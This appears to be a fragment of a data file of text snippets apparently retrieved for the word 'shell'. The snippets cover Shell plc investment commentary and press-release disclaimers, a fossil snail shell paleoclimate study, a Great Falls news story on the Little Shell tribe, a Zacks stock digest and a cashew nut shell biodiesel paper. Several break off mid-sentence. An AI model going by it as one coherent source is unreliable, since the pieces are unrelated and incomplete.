            "content": "We recently published a list of 12 Best Energy Stocks to Buy According to Billionaire Ken Fisher. In this article, we are going to take a look at where Shell plc (NYSE:SHEL) stands against other best energy stocks to buy according to billionaire Ken Fisher.\n\nKen Fisher, an American billionaire investor, author, and financial analyst, founded and manages Fisher Asset Management. He is one of the world\u2019s most renowned investment managers, known for his contrarian style and strong confidence in capitalism. With an estimated net worth of more than $11.2 billion, he is also one of the wealthiest billionaires in the world. Fisher launched his fund in 1979, which has since developed into a global investment powerhouse that manages over $252 billion in securities. That said, Fisher\u2019s influence extends beyond asset management to include financial journalism and publishing. He penned a Forbes magazine column for more than three decades, the longest in the magazine\u2019s history, and authored eleven books, four of which were New York Times bestsellers.\n\nNotably, Fisher pioneered the use of the Price-to-Sales Ratio in the early 1980s, demonstrating its use as a tool for financial investment research. His hedge fund uses this technique to manage small-capitalization portfolios for institutional investors across the globe. Fisher Asset Management\u2019s concept is founded on Ken Fisher\u2019s understanding of the operation of free markets. The billionaire investor believes that supply and demand are the only factors influencing securities prices and that capital markets are generally effective discounters of well-known information.\n\nEnergy Sector Outlook\n\nEnergy companies were off to a solid start this year, outperforming the S&P 500 for the first time in years, driven by gains in natural gas equities as prices recover from record lows. The sector\u2019s advances indicate a notable turnaround for the industry. Energy stocks fell 1.3% in 2023 and only gained 5.7% last year, while the S&P 500\u2019s bull run continued, rising over 50% over the past two years. According to most analysts, the sector\u2019s excellent year has been fueled by a comeback in oil and gas prices with the beginning of the cold weather in the United States, resulting in significant gains for natural gas equities.\n\nAs the energy sector evolves, investors must balance the stability of traditional fossil fuels with the growing potential of renewables and modern nuclear technologies. In such a market dynamic, oil and gas firms have placed importance on high-return investments and increased production efficiency, which has led to noteworthy financial performance and investor confidence. According to Deloitte, industry capital expenditures have risen 53% in the last four years, while net profit has increased by approximately 16%. Despite ongoing uncertainties over OPEC+ production cutbacks and potential interruptions to energy commerce, the industry\u2019s financial discipline, customer-focused initiatives, and technical advances position it for a successful 2025.",

In this press release \"Shell\", \"Shell Group\" and \"Group\" are sometimes used for convenience where references are made to Shell plc and its subsidiaries in general. Likewise, the words \"we\", \"us\" and \"our\" are also used to refer to Shell plc and its subsidiaries in general or to those who work for them. These terms are also used where no useful purpose is served by identifying the particular entity or entities. ''Subsidiaries'', \"Shell subsidiaries\" and \"Shell companies\" as used in this press release refer to entities over which Shell plc either directly or indirectly has control. The term \"joint venture\", \"joint operations\", \"joint arrangements\", and \"associates\" may also be used to refer to a commercial arrangement in which Shell has a direct or indirect ownership interest with one or more parties. The term \"Shell interest\" is used for convenience to indicate the direct and/or indirect ownership interest held by Shell in an entity or unincorporated joint arrangement, after exclusion of all third-party interest.\n\nForward-Looking Statements\n\nThis press release contains forward-looking statements (within the meaning of the U.S. Private Securities Litigation Reform Act of 1995) concerning the financial condition, results of operations and businesses of Shell. All statements other than statements of historical fact are, or may be deemed to be, forward-looking statements. Forward-looking statements are statements of future expectations that are based on management's current expectations and assumptions and involve known and unknown risks and uncertainties that could cause actual results, performance or events to differ materially from those expressed or implied in these statements. Forward-looking statements include, among other things, statements concerning the potential exposure of Shell to market risks and statements expressing management's expectations, beliefs, estimates, forecasts, projections and assumptions. These forward-looking statements are identified by their use of terms and phrases such as \"aim\"; \"ambition\"; ''anticipate''; ''believe''; \"commit\"; \"commitment\"; ''could''; ''estimate''; ''expect''; ''goals''; ''intend''; ''may''; \"milestones\"; ''objectives''; ''outlook''; ''plan''; ''probably''; ''project''; ''risks''; \"schedule\"; ''seek''; ''should''; ''target''; ''will''; \"would\" and similar terms and phrases. There are a number of factors that could affect the future operations of Shell and could cause those results to differ materially from those expressed in the forward-looking statements included in this press release, including (without limitation): (a) price fluctuations in crude oil and natural gas; (b) changes in demand for Shell's products; (c) currency fluctuations; (d) drilling and production results; (e) reserves estimates; (f) loss of market share and industry competition; (g) environmental and physical risks; (h) risks associated with the identification of suitable potential acquisition properties and targets, and successful negotiation and completion of such transactions; (i) the risk of doing business in developing countries and countries subject to international sanctions; (j) legislative, judicial, fiscal and regulatory developments including regulatory measures addressing climate change; (k) economic and financial market conditions in various countries and regions; (l) political risks, including the risks of expropriation and renegotiation of the terms of contracts with governmental entities, delays or advancements in the approval of projects and delays in the reimbursement for shared costs; (m) risks associated with the impact of pandemics, such as the COVID-19 (coronavirus) outbreak, regional conflicts, such as the Russia-Ukraine war, and a significant cybersecurity breach; and (n) changes in trading conditions. No assurance is provided that future dividend payments will match or exceed previous dividend payments. All forward-looking statements contained in this press release are expressly qualified in their entirety by the cautionary statements contained or referred to in this section. Readers should not place undue reliance on forward-looking statements. Additional risk factors that may affect future results are contained in Shell plc's Form 20-F for the year ended December 31, 2023 (available at www.shell.com/investors/news-and-filings/sec-filings.html and www.sec.gov). These risk factors also expressly qualify all forward-looking statements contained in this press release and should be considered by the reader. Each forward-looking statement speaks only as of the date of this press release, March 21, 2025. Neither Shell plc nor any of its subsidiaries undertake any obligation to publicly update or revise any forward-looking statement as a result of new information, future events or other information. In light of these risks, results could differ materially from those stated, implied or inferred from the forward-looking statements contained in this press release.\n\nShell's net carbon intensity\n\nAlso, in this press release we may refer to Shell's \"Net Carbon Intensity\" (NCI), which includes Shell's carbon emissions from the production of our energy products, our suppliers' carbon emissions in supplying energy for that production and our customers' carbon emissions associated with their use of the energy products we sell. Shell's NCI also includes the emissions associated with the production and use of energy products produced by others which Shell purchases for resale. Shell only controls its own emissions. The use of the terms Shell's \"Net Carbon Intensity\" or NCI are for convenience only and not intended to suggest these emissions are those of Shell plc or its subsidiaries.\n\nShell's net-Zero Emissions Target\n\nShell's operating plan, outlook and budgets are forecasted for a ten-year period and are updated every year. They reflect the current economic environment and what we can reasonably expect to see over the next ten years. Accordingly, they reflect our Scope 1, Scope 2 and NCI targets over the next ten years. However, Shell's operating plans cannot reflect our 2050 net-zero emissions target, as this target is currently outside our planning period. In the future, as society moves towards net-zero emissions, we expect Shell's operating plans to reflect this movement. However, if society is not net zero in 2050, as of today, there would be significant risk that Shell may not meet this target.\n\nForward Looking Non-GAAP measures\n\nThis press release may contain certain forward-looking non-GAAP measures such as cash capital expenditure and divestments. We are unable to provide a reconciliation of these forward-looking non-GAAP measures to the most comparable GAAP financial measures because certain information needed to reconcile those non-GAAP measures to the most comparable GAAP financial measures is dependent on future events some of which are outside the control of Shell, such as oil and gas prices, interest rates and exchange rates. Moreover, estimating such GAAP measures with the required precision necessary to provide a meaningful reconciliation is extremely difficult and could not be accomplished without unreasonable effort. Non-GAAP measures in respect of future periods which cannot be reconciled to the most comparable GAAP financial measure are calculated in a manner which is consistent with the accounting policies applied in Shell plc's consolidated financial statements.\n\nThe contents of websites referred to in this press release do not form part of this press release.\n\nWe may have used certain terms, such as resources, in this press release that the United States Securities and Exchange Commission (SEC) strictly prohibits us from including in our filings with the SEC. Investors are urged to consider closely the disclosure in our Form 20-F, File No 1-32575, available on the SEC website www.sec.gov.\n\nSOURCE Shell",

            "content": "Due to the scarcity of modern relatives of C. orithyia, it is difficult to establish a modern reference in the study area to explore the environmental significance of shell morphology. Fortunately, the correlation between shell morphology (although from other species) and climatic/environmental parameters has been well explored elsewhere, on temporal and spatial scales and with various research protocol (field observation, common garden and controlled laboratory experiments)37,38,39,40,41. From the perspective of variation in shell aperture shape represented by RW1 and RW2, these studies generally consider that the aperture area of land snail shells is generally greater in moister environments41,42. For example, a study from Poland found that larger shell apertures of snails are developed in higher humidity41; however, a small aperture, usually accompanied by a reduction in the area of exposed surface, could be advantages in drier conditions with higher water stress21,39. Specifically, they found that temporal variation in relative humidity showed positive relationships with aperture width and aperture height. Another study demonstrated that shell volume and aperture area tend to be larger in areas with higher annual rainfall level, altitude, and mean average temperature by using snails (Helix pomatia var. Banatica) from two distinct sites characterized by different climatic conditions42. Also, for snail fossils, several studies found that the shell size was related to climate condition of interglacial-glacial phases, with smaller sizes in glacial intervals43,44,45.\n\nSeen from the above, most studies emphasize the key role of environmental aridity/humidity in regulating the shell morphology variations, especially the shell aperture shape. Evaporation through the aperture is the main mechanism by which land snails lose body water23,25. As an animal that prefers warm and humid environments, snails become inactive and cease growth at temperatures below 10 \u00b0C or when the environment becomes excessively dry46. The modern climate in Xifeng (Fig. 1B), influenced by the East Asian monsoon system, generally shows a cold-dry winter and a warm-humid summer, with significant intra-annual variations in temperature (\u22124.2 to 21.4 \u00b0C, mean: 9.2 \u00b0C), precipitation (3.7 to 111.4 mm, mean: 44.0 mm) and relative humidity (52 to 76%, mean: 62%). Also, field observation found that C. fasciola in the CLP typically enters hibernation from October-November to early March-April and resumes activity once temperatures rise above ~ 10 \u00b0C from late spring to early autumn47. Thus, it is reasonable to assume that the life style of our snails is divided into two very different stages\u2014active and resting\u2014according to different water loss contexts. In the active stage, water directly evaporates through the open aperture; and in the resting stage, evaporation from the animal is effectively reduced as a result of its tight attachment to the resting substrate and the epiphragm that seals the aperture. By their close attachment to the substrate and the epiphragm, the ability of snails to resist drought is enhanced by resting and a decrease in the relative virtual area of the aperture (RA ap / sh, Fig. 4).\n\nIn RW1, the longitudinal shift of the UPA (Fig. 2i) indicates the downward deflection of the aperture (DDA; Fig. S3a), which is a common phenomenon observed during the final stage of shell growth in many land snails21. The DDA reduces the relative aperture area, which enhances water retention. In other words, DDA can regulate the drought resistance ability of C. orithyia by altering the relative aperture area. As noted above, for land snails in the resting stage, the relative aperture area has only a limited ability to resist arid conditions, while in the active stage, land snails tend to reduce evaporation by developing a narrower aperture. Overall, we infer that the RW1 of C. orithyia reflects its ability to resist drought during the active period, with a smaller relative aperture area corresponding to greater drought resistance, while conversely a larger relative aperture area corresponds to weaker drought resistance.\n\nIn RW2, the lateral shift of the UPA (Fig. 2j) corresponds to the forward extent of the UPA (Fig. S3b), which can induce a leftward shift in LM 5, thereby augmenting both the whorl cross-sectional and aperture areas. However, the changes in the parietal wall (Fig. 1b) result in very minor changes in the effective aperture area, and thus the virtual aperture area responsible for evaporation/water loss is not increased by the forward extension of the upper lip, so that RW2 barely influences the evaporation rate. Overall, this indicates that the variations in the relative aperture area represented by RW2 are unlikely to significantly impact the drought resistance of C. orithyia. However, due to the forward extension, the UPA enables a closer contact with the substrate surface, which increases the ability of the resting animal to reduce water loss and hence survive the resting stage. From this perspective, RW2 is a possible index of the snail\u2019s ability to resist drought during the dormant or resting stage.\n\nAlthough both RW1 and RW2 represent morphological changes in the shell aperture, they represent two distinct aspects of a snail\u2019s adaptative survival strategy. Specifically, RW1 corresponds to the snail\u2019s ability to resist desiccation during active periods, while RW2 reflects its capacity for water retention during dormancy.\n\nPeriodicities of the aperture shape of fossil C. orithyia (represented by RW1 and RW2).\n\nTo identify periodic components in the time series of major aperture shape, we grouped the samples into 10-kyr intervals and then performed spectral analysis on the RWs, using the REDFIT program in Past3 software48. As shown in Figs. 5 and 6, the dominant Earth orbital cycle in the RW1 record is ~ 23 kyr, which is also the case for speleothem \u03b418O records from China6. Wavelet analysis also show some degree of precession signal for RW1 between 150 and 250 ka (Fig. S4). More importantly, cross-spectral analysis shows that RW1 were coherent with speleothem \u03b418O within the precessional band, although the correlation between the two does not pass the significance test due to some phase offsets (Fig. S5, Fig. S6a, b). The RW1 score generally increases with increasing speleothem \u03b418O, indicating that a reduction in shell aperture size corresponds to a weakening of ASM intensity. As snails with smaller apertures have a greater resistance to drought, the increasing proportion of C. orithyia with a small aperture in the population suggests that the snail\u2019s living habitat is experiencing drought stress. Therefore, our results suggest a tele-connection between the speleothem \u03b418O record in southern China and monsoon proxy records from northern China, demonstrating that a decrease in ASM intensity was accompanied by aridification in northern China. As noted in the introduction, the ~ 20-kyr periodicity in speleothem \u03b418O has also been identified in loess records from northern China, such as in the \u03b413C record of inorganic carbonate11and a recently reported loess record that spliced by MS for interglacials and the inverse sand content for glacials49. From another perspective, these results from northern China, together with our RW1 record, suggest that the speleothem \u03b418O record is more indicative of the overall ASM intensity, or the large-scale monsoon circulation, rather than the local precipitation amount.\n\nIn contrast to RW1, the RW2 record demonstrates intervals with obliquity-like cycles in addition to precession cycles (Fig. 6b, Fig. S4). On the orbital scale, the RW2 record closely resembles the record of summer monsoonal precipitation reconstructed from the Sr/Ca ratio of loess microcodium10 (Fig. 5d, Fig. S6c), and the two show moderate coherence within the obliquity band (Fig. S5). An obliquity signal of monsoonal precipitation has also been found in a loess carbonate \u03b413C record11. These observations suggest that, in addition to precession, obliquity forcing may be an additional critical factor in regulating aridity/humidity cycles over northern China, and thus in driving ASM variations. Additionally, as RW2 reflects the snail\u2019s capacity for water retention during its dormant period, our RW2 record may indicate that certain monsoon proxies, particularly trace elements in microcodium, are biased towards precipitation variations during arid periods in northern China, thus reflecting drought severity. Consequently, arid conditions exert selective pressure on the water-retention capacity of snail shells during dormant periods, resulting in the pronounced obliquity signal in RW2.\n\nFig. 5 RW records, published ASM records, and Earth orbital parameters over the last ~ 470 kyr.

She said the project hadn\u2019t yet been federally approved so they can\u2019t seek financing.\n\nA woman attending the meeting said that she\u2019d ask Gray in a previous county meeting about their other project if they intended to build a casino and was told no, so she had concerns about their honesty and transparency.\n\nCouncil members and the neighbors in attendance for the March 6 meeting discussed fire danger in the area.\n\nGarri Mauch, council member, asked Gray to ask the \u201chigher ups\u201d for a fire department in their area during discussions for the project.\n\nMultiple civil lawsuits filed since 2016 Vinyard fire [2019]\n\nCurrently, the land where the tribe is proposing their event center is in the county and Gray said during the meeting that they had no plans to annex the property into the city, which means the city would not provide public safety resources or infrastructure.\n\nGreat Falls Fire Rescue has for years said they need at least another fire station but have not had the funding to do so and made no determination as to where a new station might be located.\n\nGreat Falls voters did not approve a public safety levy or bond in 2023.\n\nGray said the area was currently covered by Black Eagle Volunteer Fire Department.\n\nFire prompting evacuations off Vinyard Road, north of Great Falls [2019]\n\nHe said that the Little Shell would enter into an agreement with city fire and police for their services and said both agencies were willing to do that.\n\n\u201cThey like money,\u201d Gray said.\n\nGFFR Chief Jeremy Jones told The Electric that they had not been approached by anyone regarding the Little Shell project as of March 13.\n\nJones said for GFFR to enter into an agreement for fire services, the Little Shell would have to first approach the county to create a new fire district for themselves and then request fire/ems services.\n\n\u201cThis has not been done in many decades,\u201d Jones said, but that\u2019s how the current fire district were created.\n\nJones said the service fee is based on mills and detailed in state statute.\n\nGreat Falls Police Chief Jeff Newton said that no one from the Little Shell had approached him about police services for the project and he has entered in to no agreement to do so.\n\nAny agreement for public safety services for an entity outside the city limits would have to go through the city legal department and be approved by the commission.\n\nShare this: Twitter\n\nFacebook\n\n",

            "content": "Wednesday, March 19, 2025\n\n\n\nThe Zacks Research Daily presents the best research output of our analyst team. Today's Research Daily features new research reports on 16 major stocks, including Shell plc (SHEL), Uber Technologies, Inc. (UBER) and TotalEnergies SE (TTE), as well as two micro-cap stocks Geospace Technologies Corp. (GEOS) and Natural Health Trends Corp. (NHTC). The Zacks microcap research is unique as our research content on these small and under-the-radar companies is the only research of its type in the country.\n\n\n\nThese research reports have been hand-picked from the roughly 70 reports published by our analyst team today.\n\n\n\nYou can see all of today\u2019s research reports here >>>\n\n\n\nAhead of Wall Street\n\n\n\nThe daily 'Ahead of Wall Street' article is a must-read for all investors who would like to be ready for that day's trading action. The article comes out before the market opens and attempts to make sense of that morning's economic releases and how they will affect that day's market action. You can read this article for free on our home page and can actually sign up there to get an email notification as this article comes out each morning.\n\n\n\nYou can read today's AWS here >>> A Brief History of Fed Funds Moves in the 21st Century\n\n\n\nToday's Featured Research Reports\n\n\n\nShell\u2019s shares have outperformed the Zacks Oil and Gas - Integrated - International industry over the past year (+11.3% vs. +6%). The company remains a global leader in liquefied natural gas. Shell leverages its strong LNG position, bolstered by the acquisition of BG Group, to generate consistent earnings by capitalizing on steady demand for this transitional fuel.\n\n\n\nShell\u2019s strategic joint venture in the UK North Sea with Equinor enhances its dominance in the region while aligning with high-value objectives. Meanwhile, the company\u2019s strong free cash flow generation and sustained buybacks reinforce shareholder value.\n\n\n\nHowever, the underperformance of its Renewable segment is a matter of concern. Another concern is the sub-100% reserve replacement ratio, indicating challenges in replenishing produced energy. Sensitivity to oil prices and the rise of EVS are other negative factors. Therefore, investors are advised to wait for a better entry point.\n\n\n\n(You can read the full research report on Shell here >>>)\n\n\n\nShares of Uber have underperformed the Zacks Internet - Services industry over the past six months (-3.2% vs. -1.2%). The company\u2019s underperformance may be due to fears of market saturation and the possibility of self-driving cars eliminating intermediary services. Uber, which dominates the North American ride-sharing market, is likely to increase its focus on suburban markets to drive growth.\n\n\n\nThe Zacks analyst remains confident about its ability to combat the challenges with the help of a strong operating model and successful diversification strategy. Even though Uber\u2019s primary business is ride-sharing, it has diversified into food delivery and freight over time. Considering all these factors, investors are advised to wait for a better entry point.\n\n\n\n(You can read the full research report on Uber here >>>)\n\n\n\nTotalEnergies\u2019 shares have declined -5.7% over the past year against the Zacks Oil and Gas - Refining and Marketing industry\u2019s decline of -14.2%. The company\u2019s production might be impacted by security reasons in some regions and it remains exposed to acquisition-related risks as these assets contribute a sizable volume to production. The natural field decline will impact production volumes and lower profits.\n\n\n\nNevertheless, TotalEnergies benefits from contributions coming from startups, acquisitions, well-spread LNG assets and upstream assets located in the new hydrocarbon-producing regions. Multi-energy assets spread across the globe and cost reduction initiatives are benefiting the company.\n\n\n\nTotalEnergies\u2019 free cash flow allows it to increase shareholders value. It is investing in clean power generation and aims to achieve net-zero emissions by 2050.\n\n\n\n(You can read the full research report on TotalEnergies here >>>)\n\n\n\nShares of Geospace Technologies have underperformed the Zacks Electronics - Measuring Instruments industry over the past year (-42.5% vs. -2.6%). This microcap company with market capitalization of $94.04 million is facing risks which include rising costs, cash flow deterioration and customer concentration.\n\n\n\nNevertheless, Geospace maintains a strong balance sheet with no debt and $22.1 million in cash and investments, plus a $12.1 million undrawn credit facility. Despite a 25.6% year-over-year revenue decline to $37.2 million in first-quarter fiscal 2025, it posted an $8.4 million net income, aided by a 54.1% gross margin. The Smart Water segment grew 72.1% to $7.3 million, showing promise in municipal and multifamily markets.\n\n\n\nEnergy Solutions revenues fell 39.2% to $24.3 million, but a $17 million OBX sale and a pending Permanent Reservoir Monitoring (PRM) contract offer potential upside. Intelligent Industrial revenues fell 4.1% to $5.6 million. Rising research and development (R&D) investment (up 35.9% year over year) targets growth in seismic, security and smart water solutions.\n\n\n\n(You can read the full research report on Geospace Technologies here >>>)\n\n\n\nNatural Health Trends\u2019s shares have underperformed the Zacks Consumer Products - Discretionary industry over the past year (-10.8% vs. +11.7%). This microcap company with market capitalization of $58.37 million is witnessing higher freight and incentive costs pressured margins. Active members declined 4.8% to 30,870, raising concerns about engagement.\n\n\n\nExpansion into Latin America and new product launches aim to drive growth, but reliance on China, rising costs and regulatory risks remain key challenges. Expansion efforts beyond Asia remain limited. Nevertheless, Natural Health Trends saw a 9% sequential and 7% year-over-year sales increase in Hong Kong, which accounts for 82% of revenues.\n\n\n\nDespite this, full-year sales declined 2.2% to $42.9 million due to weakness in Taiwan and North America. The company improved its operating cash flow to $602,000 (before tax payments) but still reported a $3.4 million cash outflow. Cash reserves declined to $43.9 million in 2024 from $56.2 million in 2023. Operating losses narrowed to $1.3 million in 2024 from $1.7 million in 2023.\n\n\n\n(You can read the full research report on Natural Health Trends here >>>)\n\n\n\nOther noteworthy reports we are featuring today include Public Service Enterprise Group Inc.

            "content": "Characterization study on industrial waste-derived heterogeneous catalyst\n\nXRD pattern\n\nThe X-ray diffraction (XRD) pattern in Fig. 7a provides an extensive understanding of the crystalline phases of industrial waste catalyst, which is utilized as a heterogeneous catalyst in CSLB production. The peak at 30\u00b0 in 2\u03b8 indicated the presence of calcium oxide (CaO), which plays an important role in the transesterification of waste cashew nut shell liquid, enabling the conversion of triglycerides into CSLB. Furthermore, many minor peaks between 30\u00b0 and 65\u00b0 in 2\u03b8 suggest the presence of MgO (magnesium oxide) and additional CaO phases, indicating that industrial waste powder is successfully calcined to form these oxides. MgO supports the catalyst\u2019s thermal stability and durability. This XRD pattern reveals that the calcined industrial waste powder, which is largely constituted of CaO and MgO with minimal quartz inclusions, has the potential to serve as an efficient and long-lasting catalyst with a heterogeneous nature in CSLB production.\n\nFig. 7 (a) XRD pattern of industrial waste catalyst. (b) FTIR analysis of industrial waste catalyst. (c) BET analysis of industrial waste catalyst. Full size image\n\nFTIR analysis\n\nFourier Transform Infrared (FTIR) spectroscopy is a promising method for characterizing industrial waste powder, as depicted in Fig. 7b is utilized as a heterogeneous catalyst in CSLB production. The FTIR spectrum indicated different absorption bands for industrial waste catalyst functional groups, particularly carbonate ions (CO 3 2\u2212) peaks at 1634.17 cm\u22121 and 979.10 cm\u22121, indicating asymmetric and symmetric stretching vibrations. Furthermore, a sharp peak at 770.99 cm\u22121 is commonly connected with the out-of-plane bending vibration of carbonates present in industrial waste catalysts. In CSLB production, heterogeneous catalyst surface composition (CaO and MgO) is critical to increasing the reaction rate in transesterification.\n\nBET analysis\n\nBET surface area analysis is critical in assessing the porosity and surface characteristics of industrial waste powder used as a catalyst in CSLB production, as illustrated in Fig. 7c. A higher BET surface area (6.271 m\u00b2/g) of industrial waste powder generally indicates a more effective catalytic activity, as it provides greater active surface sites for the transesterification reaction in cashew nut shell liquid. The mesoporous structure of industrial waste-derived catalyst revealed through BET analysis enhances the interaction between the catalyst and the cashew nut shell liquid, improving the efficiency of CSLB conversion. Also, it provides insight into achieving sustainable CSLB production with minimal catalyst degradation.\n\nRSM-CCD for CSLB prediction and optimization\n\nThe commercialization of biodiesel requires achieving maximum yield. Industrial waste-derived catalysts with heterogeneous nature in the transesterification process are widely employed because of their high efficiency and inexpensive cost44. The CSLB yield in this process is affected by factors such as the methanol/CSL molar ratio, process temperature, and industrial catalyst usage. Equation (2) predicts CSLB yield values for input variables within the range provided in Table 4. Using multiple regression analysis, the data was transformed into a second-order polynomial equation, yielding an empirical model that defines the connection between the response and the independent variables. Design-Expert version 13.0.15 was deployed to conduct an analysis of variance (ANOVA) to figure out the statistical significance of each term in the equations, assuring good fit and favourable adjustment values. Significant terms have an F value within 95% confidence and a p-value \u2264 0.05. The ideal values for the chosen variables were obtained by examining the response surfaces and solving the regression equation. The fitted polynomial equation was depicted as three-dimensional response surface plots to show the primary and interacting effects of the independent factors on the dependent variables.\n\nThe model\u2019s fitness was assessed using ANOVA with the least squares approach. ANOVA is a powerful statistical technique that divides the entire variation in model data into distinct sources of variation, allowing one to better understand individual contributions. Table 6 provides a detailed variation analysis of our model. The regression equation\u2019s ANOVA yielded an R\u00b2 value of 0.9806, suggesting a robust model fit. Values above 0.75 are regarded as good. The R\u00b2 result indicates that the model can explain 98.06% of the observed variation in experimental parameters and interactions, leaving only 1.94% unexplained. The adjusted and forecast R\u00b2 values were 0.9632 and 0.9084, respectively, indicating the model\u2019s robustness. R\u00b2 values vary from 0 to 1.0, with values near 1.0 indicating a better fit. The model\u2019s F-value of 56.31 indicates its importance, and a p-value of less than 0.05 confirms the model\u2019s statistical significance, with the lack of fit being negligible. A lower p-value emphasizes the significance of the interactions among factors. This investigation found significant individual and interaction terms, with the exception of PT*IC, at a p-value of less than 0.05. The anticipated and experimental CSLB production values have a significant correlation (R\u00b2 = 0.9806). The yield estimation formula for CSLB, created by iterative statistical stepwise regression, is shown in Eq. (2).\n\n$$\\:\\text{C}\\text{S}\\text{L}\\text{B}\\:\\text{y}\\text{i}\\text{e}\\text{l}\\text{d}\\:\\left(\\text{\\%}\\right)=7.43\\:\\text{M}\\text{R}+21.89\\:\\text{P}\\text{T}+20.23\\:\\text{I}\\text{C}-0.029\\:\\text{M}\\text{R}\\text{*}\\text{P}\\text{T}-0.2041\\:\\text{M}\\text{R}\\text{*}\\text{I}\\text{C}-0.1091\\:{\\text{M}\\text{R}}^{2}-0.1501\\:{\\text{P}\\text{T}}^{2}-1.041\\:{\\text{I}\\text{C}}^{2}-802.95$$ (2)\n\nTable 6 ANOVA for CSLB yield. Full size table\n\nFigure 8a\u2013c displays the 3D surface plots illustrating the conversion of CSL to CSLB through the interaction between two independent variables like methanol/CSL molar ratio and process temperature (MR & PT), methanol/CSL molar ratio and industrial catalyst (MR & IC), process temperature and industrial catalyst (PT & IC) their impact on the dependent parameter, which is the CSLB yield. These plots are generated using the regression Eq. (2) and depict how each independent variable interacts with the response variable.\n\nEffects of methanol/CSL molar ratio on CSLB yield\n\nIncreasing the methanol/CSL molar ratio (MR) from 10:1 to 20:1 greatly boosts CSLB yield due to the increased availability of methanol for the transesterification process, as shown in Fig. 8a and b. During transesterification, the triglycerides in CSL react with methanol to form methyl esters (CSLB) and glycerol. A higher methanol/CSL ratio shifts the reaction equilibrium towards producing more methyl esters, thereby enhancing CSLB conversion efficiency. Additionally, excess methanol helps overcome reaction kinetics limitations, reduces the viscosity of the reaction mixture, and improves the solubility of the reactants45. This leads to better interaction between CSL and methanol molecules, resulting in a more complete reaction and significantly increasing CSLB yield.\n\nEffects of process temperature on CSLB yield\n\nThe CSLB yields a peak between 60 \u00b0C and 70 \u00b0C, as these temperatures provide ideal conditions for the transesterification reaction, resulting in the maximum conversion of triglycerides to CSLB, as depicted in Fig. 8a and c. At these temperatures, the reaction kinetics and solubility of methanol in CSL are optimal, allowing for efficient mixing and interaction of the reactants. However, when the temperature climbs to 80 \u00b0C, the CSLB yield decreases dramatically. This drop is most likely caused by methanol evaporation at higher temperatures, which reduces the alcohol available for the reaction. Thus, maintaining a temperature between 70 \u00b0C is critical for maximizing CSLB yield.\n\nFig. 8 (a\u2013c) 3D surface plots showing interaction effects of different input variables (MR, PT, and IC) on CSLB yield. Full size image\n\nEffects of industrial catalyst concentration on CSLB yield\n\nWhen the industrial waste-derived heterogeneous catalyst concentration (IC) is increased from 2 to 4 wt%, CSLB yield increases dramatically due to increased catalytic activity, which makes the transesterification process more efficient, as reported in Fig. 8b and c. At this ideal concentration, the catalyst provides adequate active sites for the process, resulting in a faster conversion of triglycerides to CSLB. However, increasing the catalyst weight from 4 to 6 wt% results in a drop in CSLB yield. This decline is caused by an overabundance of IC, which causes soap production and emulsification, preventing CSLB from being separated from glycerol and other byproducts. Furthermore, using too much IC might raise viscosity and impede mass transfer, limiting reaction efficiency and overall CSLB yield. As a result, determining the optimal IC concentration (4 wt%) is critical for increasing CSLB yield while minimizing negative effects46.\n\nFigure 9 presents the normal plot of residuals, illustrating that nearly all points of CSLB yields align closely with a straight-line pattern. This alignment indicates no significant deviations from normality, thereby confirming the adequacy of the RSM-CCD model in representing the experimental data accurately.\n\nFig. 9 Plot of externally studentized residuals of CSLB yield with normal % probability. Full size image\n\nFigure 10 illustrates the optimal conditions for maximum CSLB production as determined by statistical regression Eq. (2). With optimized inputs of 20:1 MR, 70 \u00b0C PT, and 4 wt% IC, the transesterification process achieved a maximum CSLB yield of 85.54% using desirability function approach. The overall desirability value of the CCD model is 1, confirming that all optimized conditions are ideal for the CSLB production process.\n\nFig. 10 Optimal conditions for maximum CSLB yield determined using the desirability function approach. Full size image\n\nCharacterization study on CSLB\n\nGC-MS analysis on CSLB\n\nGC-MS (Gas chromatograph coupled with mass spectrometer) is an analytical method performed to identify and quantify the CSLB\u2019s chemical composition. In this test, the CSLB is vaporised and injected into the gas chromatograph, which separates the CSLB into individual components based on properties such as boiling point and polarity. These separated components were then introduced to the mass spectrometer, which was ionized into small charged particles using an FID detector. Then, it analyses the charged particles based on the mass-to-charge ratio, producing a mass spectrum that provides information on the number of individual components in the CSLB. The amount of each compound present in a CSLB is determined by comparing it with the resultant mass spectrum to the standard spectra. There are many peaks that are visible, hence the increased presence of ester compounds, which is listed in Table 7. The peak\u2019s % area indicates the number of components contained in the CSLB. The maximum percentage of CSLB conversion from CSL using an industrial waste heterogeneous catalyst was primarily confirmed by the presence of 1-Methyl-2-hydroxybenzene (18.27%), 8-Octadecenoic acid, methyl ester (15.12%), Pentdecanoic acid, 14-methyl ester (12.87%), and Decane, 3,8-dimethyl- (11.24%) in the CSLB chromatogram.\n\nTable 7 Chemical compounds present in CSLB. Full size table\n\nFTIR analysis on CSLB\n\nFourier Transform Infra-Red (FTIR) spectroscopy is an analytical test carried out to identify and characterize the functional groups in diesel, CSL and CSLB. FTIR analysis works for a range of wavelengths in the infrared spectrum, which are transmitted through all test fuels. These fuels have the ability to transmit the IR ray\u2019s energy at different wavelengths, determining the presence of different functional groups in the CSLB\u2019s chemical composition. A graph (Fig. 11) is created by plotting the corresponding wavenumber (cm\u2212 1) on the X-axis and the transmittance (%) of the diesel, CSL and CLSB on the Y-axis. Two bands within the mid-IR spectrum range from 4000 cm\u2212 1 to 400 cm\u2212 1. A noticeable peak at 3392 cm\u2212 1 demonstrates the stretching vibration with weak absorption intensity of the hydroxyl (-OH) functional group, implying that WTSB substances contain phenols or alcohols. Stretching vibrations with substantial alkene and alkane absorption intensity are shown by the peaks at 2937 cm\u2212 1 and 2852 cm\u2212 1, respectively. These vibrations are thought to reflect the C-H functional groups in CSLB, resulting in methyl and methylene groups from transesterification. The appearance of a prominent absorption intensity peak at 1749 cm\u2212 1 corresponding to a C = O stretching vibration validates the production of ester groups, such as mono-alkyl esters, in CSLB structures. Asymmetric and symmetric bending vibrations at 1460 cm\u2212 1 and 1376 cm\u2212 1 indicate the functional groups of CH 2 and CH 3 . Similarly, the C-O functional groups formed at a sharp point of 1174 cm\u2212 1, resulting in ester bonds or linkages with CSLB molecules. A small peak at 721 cm\u2212 1 represents the out-of-plane bending (rocking) vibration of C-H bonds, indicating the presence of long-chain hydrocarbons in CSLB. The FTIR spectral analysis confirms the presence of oxygen functional groups in CSLB, highlighting its oxygenated nature. The spectral peaks of CSLB closely resemble those of conventional diesel, demonstrating comparable structural characteristics, as listed in Table 8. These findings suggest that CSLB is a viable and effective alternative to traditional diesel fuel.\n\nFig. 11 FTIR spectra of diesel, CSL and CSLB. Full size image\n\nTable 8 Functional groups in CSLB. Full size table\n\nCRDI engine emission 